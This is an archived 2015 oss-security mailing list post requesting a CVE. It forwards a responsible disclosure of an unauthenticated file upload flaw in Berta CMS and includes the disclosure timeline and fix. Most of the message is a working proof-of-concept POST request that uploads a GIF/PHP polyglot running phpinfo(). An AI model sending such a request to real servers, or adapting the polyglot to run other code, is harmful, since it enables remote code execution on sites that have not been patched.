X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7526" "Friday" "27" "March" "2015" "10:18:34" "+0000" "Simon Waters" "simon.waters@surevine.com" "<C6303836-0701-4577-A248-53800051FE45@surevine.com>" "143" "[oss-security] Fwd: Insecure file upload in Berta CMS" nil nil nil "3" "2015032710:18:34" "[oss-security] Fwd: Insecure file upload in Berta CMS" (number mark "        simon.waters Mar 27  143/7526  " thread-indent "\"[oss-security] Fwd: Insecure file upload in Berta CMS\"\n") "<F9EED012-4100-4170-8C48-FF3050869169@surevine.com>" ("<F9EED012-4100-4170-8C48-FF3050869169@surevine.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32269 invoked by uid 550); 27 Mar 2015 14:02:24 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32026 invoked from network); 27 Mar 2015 10:18:48 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:content-type:content-transfer-encoding
         :subject:date:references:to:message-id:mime-version;
        bh=mAEjBVmf13LWttxK624hR0C2woFBuN4CCZIAoMkz6eI=;
        b=PExLGevleSDg7oMh7UDQp/j28XnwFosSgmKYmwdmpOcZYiikSoqaJMBMdjVZ7eCuRp
         ISmvypzBAktQhNx8oRuGZtoNTYLnzMUNNay1vCiV/AInzqEFRXs190OEbd7kGTOJjiA6
         1cdu/6jiObjauFYb602wreTY1KNskVXm3N2fgxKsUscdN9Qmd+d+YHOxb6mAXkUAvnTy
         F8W1Obl3yRF2q37B/owMAHfi1HDxJXYCL+rm+bnn9HtQ5rC0gTQx3GSSZr6dYGJEQPrT
         GTVkZx3uiaYLFwCVDJUkISIv+92IXcvaI2E9AIG2VjtuuKg3UNDbpdFbBQo5o6H9jXzR
         UrRg==
X-Gm-Message-State: ALoCoQnZfuJoW89NL1BPbnctkfFv5toQitmEZxujpWdCAXwRXHec+XOVblzXbriV6SkWbNhEKs0e
X-Received: by 10.180.79.65 with SMTP id h1mr55663036wix.59.1427451517304;
        Fri, 27 Mar 2015 03:18:37 -0700 (PDT)
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
References: <F9EED012-4100-4170-8C48-FF3050869169@surevine.com>
Message-Id: <C6303836-0701-4577-A248-53800051FE45@surevine.com>
Mime-Version: 1.0 (Mac OS X Mail 8.2 \(2070.6\))
X-Mailer: Apple Mail (2.2070.6)
Date: Fri, 27 Mar 2015 10:18:34 +0000
From: Simon Waters <simon.waters@surevine.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Fwd: Insecure file upload in Berta CMS
To: oss-security@lists.openwall.com

Can a CVE id be allocated for this?


> Begin forwarded message:
>=20
> From: Simon Waters <simon.waters@surevine.com>
> Subject: Insecure file upload in Berta CMS
> Date: 26 March 2015 18:01:09 GMT
> To: bugtraq@securityfocus.com, fulldisclosure@seclists.org
>=20
> Berta CMS is a web based content management system using PHP and local fi=
le storage.
>=20
> http://www.berta.me/
>=20
> Due to use of a 3rd party Berta CMS website to redirect links within a ph=
ishing email brought to our attention we checked the file upload functional=
ity of this software.
>=20
> We found that the file upload didn't require authentication.
>=20
> Images with a ".php" extension could be uploaded, and all that was requir=
ed is that they pass the PHP getimagesize() function and have suitable dime=
nsions.
>=20
> It is possible for GIF image files (and possibly other image files - not =
tested) to contain arbitrary PHP whilst being well enough formed to pass th=
e getimagesize() function with acceptable dimensions.
>=20
> http://ha.ckers.org/blog/20070604/passing-malicious-php-through-getimages=
ize/ <http://ha.ckers.org/blog/20070604/passing-malicious-php-through-getim=
agesize/>
>=20
> We can't ascertain if this is the weakness that was used to compromise th=
e 3rd party server in question, however the patch requires authentication f=
or all file uploads, which will likely resolve any similar issues.
>=20
> The author was notified: 2015-03-22
> Author Acknowledge: 2015-03-23
> Patch released: 2015-03-26
>=20
> The berta-0.8.10b.zip file from: http://www.berta.me/download/  includes =
a fix that requires authentication to upload files.
>=20
>=20
> This announcement should not be interpreted as implying either the author=
, or Surevine, have conducted any in-depth assessment of the suitability of=
 Berta CMS for any purpose (Sometimes you just want to make life harder for=
 those sending phishing emails).
>=20
>=20
> The following POST request will upload a c.php file which will run phpinf=
o() when fetched on vulnerable servers.
>=20
> POST /engine/upload.php?entry=3Dtrue&mediafolder=3D.all HTTP/1.1
> Host: 192.168.56.101
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/=
20100101 Firefox/36.0
> Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0=
.8
> Accept-Language: en-US,en;q=3D0.5
> Accept-Encoding: gzip, deflate
> Referer: http://192.168.56.101/upload.html
> Connection: keep-alive
> Content-Type: multipart/form-data; boundary=3D---------------------------=
2147563051636691175750543802
> Content-Length: 1617
>=20
> -----------------------------2147563051636691175750543802
> Content-Disposition: form-data; name=3D"Filedata"; filename=3D"c.php"
> Content-Type: text/php
>=20
> GIF89/* < =C2=B3 =C3=BF=C3=BF=C3=BFfff=C3=8C=C3=8C=C3=8C333=C3=8C=C3=BF=
=C3=BF=E2=84=A2=E2=84=A2=E2=84=A23ff=C3=8C=C3=8C=C3=BF=C3=8C=C3=BF=C3=8C=E2=
=84=A2=E2=84=A2=C3=8Cf3f 33 f=E2=84=A2=E2=84=A23 3 3!=C3=BE GIF SmartSaver =
Ver1.1a , =C3=88 < =C3=BE =C3=88I=C2=AB=C2=BD8=C3=AB=C3=8D=C2=BB=C3=BF`(=C5=
=BDdi=C5=BEh=C2=AA=C2=AEl=C3=AB=C2=BEp,=C3=8Ftm=C3=9Fx=C2=AE=C3=AF|=C3=AF=
=C3=BF=C3=80 p=C2=B8 =C3=88=C2=A4r=E2=84=A2$=C3=B6=CB=9C 4=C3=AA=C2=ACZ=C2=
=AF=C3=95 c=C3=8B=C3=ADz=C2=BF`n { =E2=80=9E 2-xLn=C2=BB=C3=9F=C3=A9=C2=B3|=
=C3=8E`=C2=AB =C2=BC^O6=E2=80=A1=C3=A3kp=E2=80=9A=C6=92=E2=80=9E#jt=CB=86]v=
)~`}g=E2=82=AC_=E2=80=B9=E2=80=A6=E2=80=9D=E2=80=A2=E2=80=A2=E2=80=A1=E2=80=
=B0=E2=80=B0=E2=80=9C' _ 1=CB=9C=C5=A0=E2=80=93=C2=A4=C2=A5=E2=80=9A=C2=A2=
=E2=84=A2s=E2=80=BA& ^=C5=B8=C5=BD=C2=A1a=C2=AB=C2=A6=C2=B4=C2=B5?=C2=A8=C2=
=A9g=C2=B3$=C2=AD]=C2=AF=C5=BE=C2=B1 =C2=B6=C3=83=C3=84<=C2=B8=C2=B9=C3=82w=
 X=C2=BD\=E2=80=98^=C2=BB=C3=85=C3=92=C3=93+=C3=87=C3=88=C3=90,=C3=8D[=C3=
=94%=C3=87=C3=91=C3=9C=C3=A0=C3=A1)=C3=96=C3=9F=C3=99=C3=8B=C3=A2 =C3=9E=C3=
=A8=C3=AB=C3=AC'=C3=A4e=C3=A7 M=C3=8CJ =C3=AA=C3=AD=C3=B8=C3=B9=C3=B6=C2=BA=
 x{{ =C3=BC=C3=BD P=E2=82=AC=E2=80=9A64=20
> =C3=B0Vp=C3=83@> 8P=C6=92=C3=843 R=C2=B1pO=C5=B8=C3=87 =C3=BE =C3=9EU8=CB=
=9C!@=CB=9C (SbL9 a =E2=80=9C=C5=A16Z8=C2=B7=C2=B0 =C3=89 03 )=C2=A1#=C3=88=
=C5=B8=C3=B8D =C5=92=C3=B7=C3=B2=C3=A4=C2=B5I =C2=AC qY RN=E2=80=BAD $=C2=
=BD=C3=86=E2=82=AC=C2=A7O X=C3=85	 p =C2=A7Qd=E2=80=B9
> P=C2=ADs c=CB=9C=C2=AE &=E2=80=99y5=C2=AB=C3=9Bi[=C3=93F =C3=B0=C2=B4=E2=
=80=B9R~ =C3=84=C5=BD%=C3=9B4 Z {=C2=B7=0C =C3=90=C3=B6=C2=ADa[q=C2=A5=C3=
=8E=E2=80=A2P=E2=80=94=C3=8B]Yy o=E2=84=A2=E2=80=9E=0Cmc/*=C3=A5l,|=C2=B83=
=C2=A9=C3=84 )\f=C3=B0X=CB=9Cd.L+=C3=87=E2=80=9C=C3=83 =C3=80h=C2=BE 8{=C5=
=BEM =C3=B4b=C3=97'=E2=80=A1=E2=80=9A**G=C3=A3E=C5=92 T=C3=AF>=C3=98=C2=BAg=
n=C3=A3=C3=89h+/d{=C2=B7=E2=80=A6=C3=91=C6=92=C2=B9FU;=C3=B19=C3=AB	=E2=80=
=B0Xv} A/=C2=AC=C3=98 =E2=80=94=E2=80=B9 =C3=94=C3=BC=C2=BBu0=C3=91=C3=A5:g=
=0C =C3=83=C3=AB=C3=B4=C2=AAxv-=C3=80=E2=80=99=C3=A5=C2=AC=C2=AE=C2=B2=C3=
=87=C3=AB'R =CB=9CW=C3=B4=C2=BA=E2=84=A2=C3=BE' f XC=C3=85u=C3=BD=C3=9C=C3=
=86 ~=C3=A1=C3=AD=C3=A7 =C3=BD=C2=B9=C3=A2=C3=9Eq=C3=AA	x=C3=907=C3=9E}=C3=
=91P{	=C2=AE=C3=A7 =C3=96=E2=80=9E=C3=94=C3=A0=C6=92$
> =C2=A1/ (=C3=9Dz zQ=C3=9CL=C3=A1=C3=A1=C3=95=C2=A1=E2=82=AC =C3=BD6=E2=80=
=A1=CB=86=C3=89=E2=80=A2=C2=A8c ':=E2=80=9C=C3=A2 =C3=A9)=C2=B6 w =C3=9D <=
=C2=ADH=C2=A3A5=C3=A5=E2=80=9A=C2=A3$;F=C3=89=C2=A3=C5=92J=C3=BAw Z	=C5=BE=
=C5=A0 -=C6=92$ =C2=A1I=C3=B5 "Ob#=C3=A5=E2=84=A28=C3=B4=C2=B8=C3=8D =CB=9C=
e)a=E2=84=A2vu@=C3=A4=E2=80=94 =E2=80=9E6f"p=C5=A0 =C3=A6=C5=BE5=C2=A8=E2=
=80=B0=C3=90 XV=C3=B9&r v=09
> 3jy'=C5=BE=E2=80=9E=C5=A1=C3=89=C3=A7=C2=A3/=C3=B8Y =E2=80=A6B
> h=C2=A4=C5=93^=C5=BE f<=E2=80=B9=E2=80=99FP=E2=80=B9(n	%=C2=A4=C2=A4=C2=
=B2 )=E2=80=BAq
> *{\j0=C2=A7=C2=A6u=C5=BE *f;=C2=A9=C3=AA=C2=A3=C2=A8=C5=BD=E2=80=93=C2=AA=
=C2=AB	=C2=A7 =C3=9A=C2=A6=C2=ADk=C3=92=C2=A5`=C5=BE=E2=80=9A
> k=C2=A2oZ=C3=93 =C2=B2=C2=A1=C3=BE=C3=A6=C2=B7=C3=AB=C2=B3 =C3=B4z=C3=A5=
=C2=AF j9=C3=AB /=C2=BA9*/<?php phpinfo(); ?>/*
> `=C3=87=C5=BD=C2=B4=C3=8C=C2=B5=C2=B0U .=C2=B1=C3=A1Bk=C3=AE>#V=C3=ABE=E2=
=80=99 =C2=A6=C2=AA=C3=AE=C2=AA=E2=80=A2 =C5=A0j v=C2=AB=C2=AD =C2=A3=C3=AD=
 =C2=B9=C3=A5=C5=93=C3=AB/=C2=AE=C2=B9=C2=BE=E2=80=B9 =C3=86;h=C2=BB6 D =C2=
=B7`=C2=B0k0=C5=A0=C3=87 H=C2=A1=C2=B3=C3=BF=C3=BA=E2=80=BA =C3=83=C3=B2N n=
 =C3=84=C3=B1f/=C2=B9=C2=A4a=C3=B7=C2=B1=C3=80kF=C3=9C =E2=80=A1 Wl=C3=AE=
=C3=85=C3=8A=C3=8A4f c=C2=B6Q s=C2=B46 =C2=A2=CB=86z =C3=8A1/R=C3=87=C2=AF=
=C3=8A@Wp=C3=B1 =E2=84=A2=C3=89 =C2=B3&=C2=B8 =C2=AD=C3=87]A=C3=A6|=C3=AF=
=C5=A1=C2=AF=C3=B1 n=C2=B1 O =C3=B4=C3=95 o+=C3=AEi! =E2=80=A0 =C2=A5!"=E2=
=80=9C=C3=93=C3=80"4=C3=B5 =C2=A5=E2=80=942=C3=96=C2=A4^ =C3=B3X0w=C3=8A=E2=
=80=A0Z=E2=84=A2=C2=B4F6=C3=89 r=C3=9Du=C3=96V=C2=B3=C2=AD=C2=B2=C3=9B =C3=
=92 =C3=B3=C3=94z=C3=A2 Hqw?|k=C3=A0=E2=80=9A=C3=BF=C3=ACw=C3=85n=C3=B3=C3=
=BDU=C3=86=E2=80=99k=C2=AD=C3=B8=C3=A1=E2=80=A1e |=C3=B9=C5=B8=E2=80=A2=C2=
=A37=C5=A1=C3=A3 [L%G=E2=80=9A=C3=A3A=C2=A9=C3=A1}=E2=80=B9=E2=80=93Ku=E2=
=84=A27=C2=BC=C3=A9za q- k=E2=80=A1=C5=BDf=C3=A4=C2=AC=E2=80=A0=C2=B7=C2=AF=
=C2=AF=C2=A3=C5=BD=C3=94=C3=A9=C2=B2 $n=C3=A7 =C3=80k v=C2=BA=C2=B6'o D(=C3=
=A5=C3=A1=C2=B0<
> =C3=A9Q=E2=82=AC `=C2=A3` q}F=C3=99*=C3=AF=C3=BD=C3=B7=C3=A0=E2=80=A1/=C3=
=BE=C3=B8=C3=A4=E2=80=94o=C3=BE=C3=B9=C3=A8=C2=A7=C2=AF=C3=BE=C3=BA=C3=AC=
=C2=B7=C3=AF=C3=BE=C3=BB=C3=B0=C3=87/=C3=BF=C3=BC=C3=B4=C3=97o=C3=BF=C3=BD=
=C3=B8=C3=A7=C2=AF=C3=BF=C3=BE=C3=BC=C3=B7=C3=AF=C3=BF=C3=BF =0C ;
>=20
> -----------------------------2147563051636691175750543802
> Content-Disposition: form-data; name=3D"submit"
>=20
> Upload Image
> -----------------------------2147563051636691175750543802--

